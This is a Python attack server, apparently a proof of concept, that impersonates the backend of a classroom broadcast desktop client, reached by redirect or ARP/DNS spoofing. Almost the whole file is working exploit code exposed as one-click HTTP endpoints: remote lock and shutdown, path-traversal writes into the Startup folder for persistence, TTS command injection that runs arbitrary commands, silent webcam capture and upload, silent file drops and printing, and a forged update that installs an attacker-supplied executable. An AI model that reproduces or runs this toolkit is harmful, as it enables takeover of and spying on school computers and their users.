#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
教室小喇叭AI助手 v1.2.1 — 恶意后端 (rogue server) v2 全自动版
================================================================
两种启动方式:
  1) 环境变量重定向 (start_rogue_lab.bat): DESKTOP_BROADCAST_SERVER_URL=http://127.0.0.1:8000
  2) 同网段 MITM: ARP 欺骗 + DNS/hosts 劫持 xlb.810086.com -> 本机
     (客户端 process.env.NODE_TLS_REJECT_UNAUTHORIZED='0', TLS 校验已全局关闭)

攻击触发: HTTP GET /atk/<动作>  (浏览器/curl 均可)
"""
import argparse
import asyncio
import base64
import hashlib
import json
import os
import socket
import time
from aiohttp import web, WSMsgType

CONNECTED_WS = set()
HISTORY = []
ARGS = None

def now_ms(): return int(time.time() * 1000)
def msg_id(tag): return "poc%s%d%d" % (tag, now_ms(), len(HISTORY))
def log(s): print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)
def record(action, detail=""):
    HISTORY.append({"t": time.strftime("%H:%M:%S"), "action": action, "detail": detail})
    log("ATTACK >> %s %s" % (action, detail))

def broadcast_frame(message_type, content=None, meta=None, extra=None):
    frame = {
        "type": "broadcast.message",
        "messageId": msg_id(message_type),
        "classId": ARGS.class_id,
        "messageType": message_type,
        "message_type": message_type,
        "sender": "教务处",
        "senderRole": "teacher",
        "metadata": meta or {},
    }
    if content is not None:
        frame["content"] = content
    if extra:
        frame.update(extra)
    return frame

def command_frame(action, extra=None):
    frame = broadcast_frame("command", extra=extra)
    frame["command"] = action
    frame["action"] = action
    return frame

async def send_to_clients(payload):
    dead, sent = [], 0
    for ws in list(CONNECTED_WS):
        try:
            await ws.send_json(payload); sent += 1
        except Exception:
            dead.append(ws)
    for ws in dead:
        CONNECTED_WS.discard(ws)
    return sent

# ------------------------- 模拟官方 API -------------------------
async def api_register(request):
    body = await request.json()
    log("device register: Bearer=%s... deviceUid=%s" % (
        request.headers.get("Authorization", "")[:30], str(body.get("deviceUid"))[:30]))
    return web.json_response({"success": True, "data": {
        "id": str(100000 + len(CONNECTED_WS)),
        "deviceUid": body.get("deviceUid") or "desktop-v3-" + "a" * 36,
        "deviceToken": "poc-device-token-ATTACKER-SIGNED"}})

async def api_ok(request):
    return web.json_response({"success": True, "data": {}})

async def api_catch_up(request):
    return web.json_response({"success": True, "data": {"items": [], "hasMore": False, "nextCursor": "0"}})

async def api_check_update(request):
    if not ARGS.update_rce:
        return web.json_response({"success": True, "data": {"updateAvailable": False}})
    record("update-check", "引导客户端下载恶意安装包")
    return web.json_response({"success": True, "data": {"updateAvailable": True, "version": "9.9.9"}})

async def api_tts_ensure(request):
    # 固定 500 -> 客户端 fallback 到本地 edge-tts (命令注入点)
    return web.json_response({"success": False, "message": "tts unavailable (poc)"}, status=500)

async def api_exit_approval(request):
    return web.json_response({"success": True, "data": {
        "requireForQuit": False, "requireForLogout": False, "emailNotify": False}})

# ------------------------- 静态载荷 -------------------------
async def serve_pwned(request):
    return web.Response(text="xlb PoC: arbitrary file write verified - " + time.ctime())

async def serve_drop(request):
    return web.Response(text="dropped by rogue server - " + time.ctime())

async def serve_latest_yml(request):
    installer = os.path.abspath(ARGS.installer)
    if not os.path.exists(installer):
        return web.Response(status=404, text="installer not found")
    digest = hashlib.sha512(open(installer, "rb").read()).digest()
    sha_b64 = base64.b64encode(digest).decode()
    name = os.path.basename(installer)
    yml = ("version: 9.9.9\npath: %s\nfiles:\n  - url: %s\n    sha512: %s\nsha512: %s\n"
           "releaseDate: '2025-01-01T00:00:00.000Z'\n" % (name, name, sha_b64, sha_b64))
    log("latest.yml requested -> %s (%d bytes)" % (name, os.path.getsize(installer)))
    return web.Response(text=yml, content_type="text/yaml")

async def serve_installer(request):
    return web.FileResponse(ARGS.installer)

# ------------------------- WebSocket 网关 -------------------------
async def ws_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    log("[ws] connect from %s" % request.remote)
    async for raw in ws:
        if raw.type != WSMsgType.TEXT:
            continue
        try:
            data = json.loads(raw.data)
        except Exception:
            continue
        t = data.get("type")
        if t == "ping":
            await ws.send_json({"type": "pong"})
        elif t == "identity":
            CONNECTED_WS.add(ws)
            log("[ws] identity accepted (token NOT verified!): classId=%s deviceUid=%s ver=%s"
                % (data.get("classId"), str(data.get("deviceUid"))[:28], data.get("clientVersion")))
            await ws.send_json({"type": "identity:accepted", "classId": data.get("classId")})
            log("[ws] READY. clients online: %d  attack API: GET /atk/<name>" % len(CONNECTED_WS))
        elif t == "broadcast.delivery.ack":
            log("[ws] <- client ack: messageId=%s status=%s" % (data.get("messageId"), data.get("status")))
        elif t == "pong":
            pass
        else:
            log("[ws] <- %s: %s" % (t, json.dumps(data, ensure_ascii=False)[:120]))
    CONNECTED_WS.discard(ws)
    log("[ws] disconnect (%s)" % request.remote)
    return ws

# ------------------------- 攻击动作 -------------------------
def need_client():
    if not CONNECTED_WS:
        raise web.HTTPServiceUnavailable(text="no client online - start the app first")
    return len(CONNECTED_WS)

async def atk_lock(request):
    n = need_client(); record("lock_system", "%d client(s)" % n)
    await send_to_clients(command_frame("lock_system"))
    return web.json_response({"ok": True, "sent": n,
        "effect": "rundll32.exe user32.dll,LockWorkStation -> whole machine locks"})

async def atk_shutdown(request):
    n = need_client(); record("shutdown_system", "%d client(s)" % n)
    await send_to_clients(command_frame("shutdown_system"))
    return web.json_response({"ok": True, "sent": n,
        "effect": "120s countdown then shutdown.exe /s /t 0 (cancellable locally)"})

async def atk_lockapp(request):
    n = need_client(); code = request.query.get("code", "123456")
    record("lock_app", "unlockCode=%s" % code)
    await send_to_clients(command_frame("lock_app", {"unlockCode": code}))
    return web.json_response({"ok": True, "sent": n,
        "effect": "kiosk lock (hardcoded master code 810086 also unlocks)"})

async def atk_unlockapp(request):
    n = need_client(); record("unlock_app")
    await send_to_clients(command_frame("unlock_app"))
    return web.json_response({"ok": True, "sent": n})

async def atk_traversal(request):
    n = need_client()
    rel = request.query.get("path", "..\\..\\..\\..\\Users\\Public\\xlb_pwned.txt")
    url = request.query.get("url", "http://%s:%d/pwned.txt" % (ARGS.lan_host, ARGS.port))
    record("traversal_write", "%s <- %s" % (rel, url))
    await send_to_clients(broadcast_frame("file", content=url,
        extra={"fileName": rel, "enablePrinting": False, "printCopies": 0}))
    return web.json_response({"ok": True, "sent": n, "wrote_to": rel,
        "note": "fileName not sanitized -> path.join allows .. traversal"})

async def atk_persist(request):
    n = need_client()
    url = request.query.get("url", "http://%s:%d/pwned.txt" % (ARGS.lan_host, ARGS.port))
    user = os.environ.get("POC_USER", "user")
    rel = "..\\..\\..\\..\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\xlb_poc.txt" % user
    record("persist_startup", rel)
    await send_to_clients(broadcast_frame("file", content=url,
        extra={"fileName": rel, "enablePrinting": False, "printCopies": 0}))
    return web.json_response({"ok": True, "sent": n, "wrote_to": rel,
        "note": "write into user Startup folder -> persistence"})

async def atk_tts(request):
    n = need_client()
    user_cmd = request.query.get("cmd", "start calc")
    payload = '你好\\" & %s & \\"' % user_cmd
    record("tts_rce", "cmd=%r" % user_cmd)
    await send_to_clients(broadcast_frame("text", content=payload,
        meta={"enableTTS": True, "ttsVoiceType": "female-lively", "displayMode": "banner"}))
    return web.json_response({"ok": True, "sent": n, "injected_text": payload,
        "chain": "tts-speak -> cloud 500 -> edge-tts exec(cmd string) -> command execution"})

async def atk_snapshot(request):
    n = need_client(); session = "poc%d" % now_ms()
    record("camera_snapshot", session)
    await send_to_clients(command_frame("smart-attendance:snapshot",
        {"sessionId": session, "mode": "single"}))
    return web.json_response({"ok": True, "sent": n, "session": session,
        "effect": "hidden window captures webcam 1920x1080 and uploads"})

async def atk_drop(request):
    n = need_client()
    name = request.query.get("name", "xlb_poc_drop.txt")
    url = request.query.get("url", "http://%s:%d/drop.txt" % (ARGS.lan_host, ARGS.port))
    record("silent_drop", "%s <- %s" % (name, url))
    await send_to_clients(broadcast_frame("file", content=url,
        extra={"fileName": name, "enablePrinting": False, "printCopies": 0}))
    return web.json_response({"ok": True, "sent": n, "dropped": "Desktop/" + name})

async def atk_print(request):
    n = need_client()
    url = request.query.get("url", "http://%s:%d/drop.txt" % (ARGS.lan_host, ARGS.port))
    copies = int(request.query.get("copies", "1"))
    record("silent_print", "copies=%d" % copies)
    await send_to_clients(broadcast_frame("file", content=url,
        extra={"fileName": "print_poc.txt", "enablePrinting": True, "printCopies": copies}))
    return web.json_response({"ok": True, "sent": n,
        "effect": "silent download + PowerShell ShellExecute print x%d" % copies})

async def atk_update(request):
    if not ARGS.update_rce:
        return web.json_response({"ok": False, "error": "start with --update-rce"}, status=400)
    n = need_client(); record("update_rce")
    await send_to_clients(command_frame("desktop_update_force"))
    return web.json_response({"ok": True, "sent": n,
        "chain": "check-update -> latest.yml (no publisherName -> skip Authenticode) -> download -> 3s quitAndInstall"})

async def atk_status(request):
    return web.json_response({"clients_online": len(CONNECTED_WS), "history": HISTORY[-30:]})

async def atk_help(request):
    return web.json_response({a: "GET /atk/%s" % a for a in
        ["status", "lock", "shutdown", "lockapp", "unlockapp", "traversal", "persist",
         "tts", "snapshot", "drop", "print", "update"]})

async def index(request):
    return web.Response(text="""<h2>xlb rogue server - attack console</h2>
<p>clients online: %d</p><ul>
<li><a href="/atk/lock">/atk/lock - lock screen</a></li>
<li><a href="/atk/shutdown">/atk/shutdown - 120s countdown</a></li>
<li><a href="/atk/lockapp">/atk/lockapp - kiosk lock</a></li>
<li><a href="/atk/unlockapp">/atk/unlockapp</a></li>
<li><a href="/atk/traversal">/atk/traversal - path traversal write</a></li>
<li><a href="/atk/persist">/atk/persist - startup folder write</a></li>
<li><a href="/atk/tts">/atk/tts - edge-tts cmd injection (RCE)</a></li>
<li><a href="/atk/snapshot">/atk/snapshot - silent webcam</a></li>
<li><a href="/atk/drop">/atk/drop - silent desktop drop</a></li>
<li><a href="/atk/print">/atk/print - silent print</a></li>
<li><a href="/atk/update">/atk/update - fake update RCE</a></li>
<li><a href="/atk/status">/atk/status</a></li></ul>""" % len(CONNECTED_WS),
        content_type="text/html")

async def main():
    app = web.Application()
    app.router.add_post("/api/v2/devices/register", api_register)
    app.router.add_post("/api/v2/devices/heartbeat", api_ok)
    app.router.add_post("/api/v2/devices/exit-requests", api_ok)
    app.router.add_get("/api/v2/desktop/broadcast-catch-up", api_catch_up)
    app.router.add_post("/api/v2/download/desktop/check-update", api_check_update)
    app.router.add_post("/api/v2/tts/ensure", api_tts_ensure)
    app.router.add_get("/api/v2/tts/voices", api_ok)
    app.router.add_get("/api/v2/devices/exit-approval-settings/{cid}", api_exit_approval)
    app.router.add_get("/pwned.txt", serve_pwned)
    app.router.add_get("/drop.txt", serve_drop)
    app.router.add_get("/ws", ws_handler)
    app.router.add_get("/", index)
    if ARGS.update_rce:
        app.router.add_get("/desktop-updates/latest.yml", serve_latest_yml)
        app.router.add_get("/desktop-updates/{name}", serve_installer)
        app.router.add_get("/desktop-updates/latest.yml.sig", lambda r: web.Response(status=404))
    for route in ["status", "lock", "shutdown", "lockapp", "unlockapp", "traversal",
                  "persist", "tts", "snapshot", "drop", "print", "update", "help"]:
        app.router.add_get("/atk/%s" % route, globals()["atk_" + route])
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, ARGS.host, ARGS.port)
    await site.start()
    log("rogue server: http://%s:%d (LAN http://%s:%d)" % (ARGS.host, ARGS.port, ARGS.lan_host, ARGS.port))
    log("attack API: GET /atk/lock | /atk/tts | /atk/traversal | /atk/snapshot | ...")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    def lan_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"
        finally:
            s.close()
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--class-id", default="10001")
    parser.add_argument("--update-rce", action="store_true")
    parser.add_argument("--installer", default=os.path.join(os.path.dirname(__file__), "installer.exe"))
    ARGS = parser.parse_args()
    ARGS.lan_host = lan_ip()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
